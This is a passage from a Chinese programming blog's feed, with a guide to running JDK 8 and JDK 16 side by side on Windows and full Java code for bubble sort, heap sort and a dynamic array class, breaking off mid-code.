    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="jdk8-和jdk16以及其他版本同时安装混合使用方法"><a href="#jdk8-和jdk16以及其他版本同时安装混合使用方法" class="headerlink" title="jdk8 和jdk16以及其他版本同时安装混合使用方法"></a>jdk8 和jdk16以及其他版本同时安装混合使用方法</h1><blockquote>
<ul>
<li><h2 id="一、首先去下载jdk8和jdk16"><a href="#一、首先去下载jdk8和jdk16" class="headerlink" title="一、首先去下载jdk8和jdk16"></a>一、首先去下载jdk8和jdk16</h2><ul>
<li>jdk16-<a href="https://www.oracle.com/java/technologies/javase-jdk16-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase-jdk16-downloads.html</a></li>
<li>jdk-8u291-<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html" target="_blank" rel="noopener">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</a></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705155505689.png" alt="image-20210705155505689"></li>
</ul>
</li>
<li><h2 id="二、环境配置变量（此电脑-gt-属性-gt-高级系统设置-gt-环境变量）"><a href="#二、环境配置变量（此电脑-gt-属性-gt-高级系统设置-gt-环境变量）" class="headerlink" title="二、环境配置变量（此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量）"></a>二、环境配置变量（此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量）</h2><ul>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705154325320.png" alt="image-20210705154325320"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705154457518.png" alt="image-20210705154457518"></p>
</li>
<li><h4 id="变量名：JAVA-HOME"><a href="#变量名：JAVA-HOME" class="headerlink" title="变量名：JAVA_HOME"></a>变量名：JAVA_HOME</h4></li>
<li><h4 id="变量值：C-Program-Files-Java-jdk16-刚刚复制的路径"><a href="#变量值：C-Program-Files-Java-jdk16-刚刚复制的路径" class="headerlink" title="变量值：C:\Program Files\Java\jdk16(刚刚复制的路径)"></a>变量值：C:\Program Files\Java\jdk16(刚刚复制的路径)</h4></li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705154552837.png" alt="image-20210705154552837"></p>
</li>
<li><h4 id="变量名：CLASSPATH"><a href="#变量名：CLASSPATH" class="headerlink" title="变量名：CLASSPATH"></a>变量名：CLASSPATH</h4></li>
<li><h4 id="变量值：-JAVA-HOME-lib-dt-jar-JAVA-HOME-lib-tools-jar"><a href="#变量值：-JAVA-HOME-lib-dt-jar-JAVA-HOME-lib-tools-jar" class="headerlink" title="变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar"></a>变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</h4></li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705154734645.png" alt="image-20210705154734645"></p>
</li>
<li><h4 id="变量名：Path"><a href="#变量名：Path" class="headerlink" title="变量名：Path"></a>变量名：Path</h4></li>
<li><h4 id="变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin"><a href="#变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin" class="headerlink" title="变量值：%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;"></a>变量值：%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</h4></li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210706201827607.png" alt="image-20210706201827607"></p>
</li>
<li><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705155100847.png" alt="image-20210705155100847"></p>
</li>
</ul>
</li>
<li><h2 id="三、查看jdk版本进行混合使用"><a href="#三、查看jdk版本进行混合使用" class="headerlink" title="三、查看jdk版本进行混合使用"></a>三、查看jdk版本进行混合使用</h2><ul>
<li><h3 id="1、打开cmd"><a href="#1、打开cmd" class="headerlink" title="1、打开cmd"></a>1、打开cmd</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705155235159.png" alt="image-20210705155235159"></li>
</ul>
</li>
<li><h3 id="2、java-–version-（查看16版本）"><a href="#2、java-–version-（查看16版本）" class="headerlink" title="2、java –version （查看16版本）"></a>2、java –version （查看16版本）</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705155305520.png" alt="image-20210705155305520"></li>
</ul>
</li>
<li><h3 id="3、想换jdk8很简单，只需要一步"><a href="#3、想换jdk8很简单，只需要一步" class="headerlink" title="3、想换jdk8很简单，只需要一步"></a>3、想换jdk8很简单，只需要一步</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705155428594.png" alt="image-20210705155428594"></li>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705155519059.png" alt="image-20210705155519059"></li>
</ul>
</li>
<li><h3 id="4、java-version（看8版本）"><a href="#4、java-version（看8版本）" class="headerlink" title="4、java -version（看8版本）"></a>4、java -version（看8版本）</h3><ul>
<li><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210705155602270.png" alt="image-20210705155602270"></li>
</ul>
</li>
<li><h2 id="5、结束"><a href="#5、结束" class="headerlink" title="5、结束"></a>5、结束</h2></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>JAVA</tag>
        <tag>版本共存</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-冒泡排序（完整代码）</title>
    <url>/2021/06/30/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%EF%BC%88%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="冒泡排序执行截图"><a href="#冒泡排序执行截图" class="headerlink" title="冒泡排序执行截图"></a>冒泡排序执行截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210630154602731.png" alt="image-20210630154602731"></p>
<h1 id="冒泡排序执行（完整代码）"><a href="#冒泡排序执行（完整代码）" class="headerlink" title="冒泡排序执行（完整代码）"></a>冒泡排序执行（完整代码）</h1><h2 id="Bubble-java（冒泡排序）"><a href="#Bubble-java（冒泡排序）" class="headerlink" title="Bubble.java（冒泡排序）"></a>Bubble.java（冒泡排序）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BubbleSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BubbleSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] data)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i + <span class="number">1</span> &lt; data.length; i ++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// arr[ n - i , n] 已经排好序</span></span><br><span class="line">            <span class="comment">// 通过冒泡在 arr[n - i - 1 ] 位置放上合适的元素</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ;  j  &lt; data.length - i - <span class="number">1</span>; j ++ )</span><br><span class="line">                <span class="comment">// j , j + 1</span></span><br><span class="line">                <span class="keyword">if</span>(data[j].compareTo(data[j + <span class="number">1</span>])&gt; <span class="number">0</span>)</span><br><span class="line">                    swap(data, j , j +<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j )</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">100000</span>;</span><br><span class="line">        Integer[] arr1 = ArrayGenerator.generateRandomArray(n, n);</span><br><span class="line">        Integer[] arr2 = Arrays.copyOf(arr1, arr1.length);</span><br><span class="line">        sort(arr2);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)</span><br><span class="line">            System.out.println(arr2[i]);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"BubbleSort"</span>,arr1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="SortingHelper-java（辅助进行算法时间输出的）"><a href="#SortingHelper-java（辅助进行算法时间输出的）" class="headerlink" title="SortingHelper.java（辅助进行算法时间输出的）"></a>SortingHelper.java（辅助进行算法时间输出的）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortingHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SortingHelper</span><span class="params">()</span></span>&#123;&#125; <span class="comment">//私有类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isSorted</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt; arr.length; i++)</span><br><span class="line">            <span class="keyword">if</span> (arr[i - <span class="number">1</span>].compareTo(arr[i]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sortTest</span><span class="params">(String sortname, E[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">if</span>(sortname.equals(<span class="string">"SelectionSort"</span>)) &#123;</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort"</span>))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort2"</span>))</span><br><span class="line">            InsertionSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort"</span>))</span><br><span class="line">            MergeSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort2"</span>))</span><br><span class="line">            MergeSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort3"</span>))</span><br><span class="line">            MergeSort.sort3(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort4"</span>))</span><br><span class="line">            MergeSort.sort4(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSortBU"</span>))</span><br><span class="line">            MergeSort.sortBU(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort"</span>))</span><br><span class="line">            QuickSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort2"</span>))</span><br><span class="line">            QuickSort.sort2ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort3"</span>))</span><br><span class="line">            QuickSort.sort3ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"HeapSort"</span>))</span><br><span class="line">            HeapSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"BubbleSort"</span>))</span><br><span class="line">            BubbleSort.sort(arr);</span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//纳米要/9个零</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!SortingHelper.isSorted(arr))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(sortname + <span class="string">"failed"</span>);</span><br><span class="line">        System.out.println(String.format(<span class="string">"%s , n = %d : %f s "</span>, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java（辅助测试用例的，生成随机的一组数组或有序的一组数组）"><a href="#ArrayGenerator-java（辅助测试用例的，生成随机的一组数组或有序的一组数组）" class="headerlink" title="ArrayGenerator.java（辅助测试用例的，生成随机的一组数组或有序的一组数组）"></a>ArrayGenerator.java（辅助测试用例的，生成随机的一组数组或有序的一组数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>堆排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-堆排序（完整代码）</title>
    <url>/2021/06/30/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86%E6%8E%92%E5%BA%8F%EF%BC%88%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="堆排序和其他排序算法时间复杂度比较截图"><a href="#堆排序和其他排序算法时间复杂度比较截图" class="headerlink" title="堆排序和其他排序算法时间复杂度比较截图"></a>堆排序和其他排序算法时间复杂度比较截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210630150821902.png" alt="image-20210630150821902"></p>
<h1 id="堆排序执行（完整代码）"><a href="#堆排序执行（完整代码）" class="headerlink" title="堆排序执行（完整代码）"></a>堆排序执行（完整代码）</h1><h2 id="MaxHeap-java（最大堆数据结构）"><a href="#MaxHeap-java（最大堆数据结构）" class="headerlink" title="MaxHeap.java（最大堆数据结构）"></a>MaxHeap.java（最大堆数据结构）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaxHeap</span>&lt;<span class="title">E</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">E</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Array&lt;E&gt; data;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxHeap</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> Array&lt;&gt;(capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MaxHeap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        data  = <span class="keyword">new</span> Array&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回堆中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.getSize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个布尔值，表示堆中是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回完全二叉树的数组表示中，一个索引所表示的元素的父亲节点的索引</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span>  <span class="title">parent</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"index-0 doesn't have parent."</span>);</span><br><span class="line">        <span class="keyword">return</span> (index - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回完全二叉树的数组表示中，一个索引所表示的元素的左孩子节点的索引</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">leftChild</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回完全二叉树的数组表示中，一个索引所表示的元素右孩子节点的索引</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">rightchild</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向堆中添加元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        data.addLast(e);</span><br><span class="line">        siftUp(data.getSize()- <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftUp</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(k &gt; <span class="number">0</span> &amp;&amp; data.get(parent(k)).compareTo(data.get(k)) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">            data.swap(k , parent(k));</span><br><span class="line">            k = parent(k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 看堆中的最大元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">findMax</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(data.getSize()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"can not findMax when heap is empty!"</span>);</span><br><span class="line">        <span class="keyword">return</span> data.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出堆中最大元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">extractMax</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E ret = findMax();</span><br><span class="line"></span><br><span class="line">        data.swap(<span class="number">0</span>, data.getSize()-<span class="number">1</span>);</span><br><span class="line">        data.removeLast();</span><br><span class="line">        siftDown(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k )</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(leftChild(k) &lt; data.getSize() )&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> j = leftChild(k);</span><br><span class="line">            <span class="keyword">if</span>(j + <span class="number">1</span> &lt; data.getSize() &amp;&amp; data.get(j+<span class="number">1</span>).compareTo(data.get(j))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                j = rightchild(k);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//data[j] 是左右孩子中最大值</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(data.get(k).compareTo(data.get(j)) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            data.swap(k,j);</span><br><span class="line">            k = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Array-java-堆使用的自定义动态数组"><a href="#Array-java-堆使用的自定义动态数组" class="headerlink" title="Array.java(堆使用的自定义动态数组)"></a>Array.java(堆使用的自定义动态数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Array</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> E[] data;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;  <span class="comment">//大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数 转入数组的容量capacity构造Array</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">        data =(E[])<span class="keyword">new</span> Object[capacity];</span><br><span class="line">        size = <span class="number">0</span>    ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无参的构造函数，默认数组的容量capacity = 10</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Array</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="number">10</span>); <span class="comment">//调用有参构造函数传入10设定初始大小</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组中元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取数组的容量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCapacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回数组是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向所有元素后添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(size == data.length) &#123;</span></span><br><span class="line"><span class="comment">//             throw new IllegalArgumentException("AddLast failed. Array is full.");</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//         data[size] = e;</span></span><br><span class="line"><span class="comment">//         size ++;</span></span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在所有元素前添加一个新元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在第index个位置插入一个新元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size )&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Require index &gt;=0 and index &lt;= size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * data.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = size - <span class="number">1</span> ; i &gt;= index ; i  --)&#123;</span><br><span class="line">            data[i + <span class="number">1</span>]=data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        data[index] = e;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取index索引位置的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Index is illegal."</span>);</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 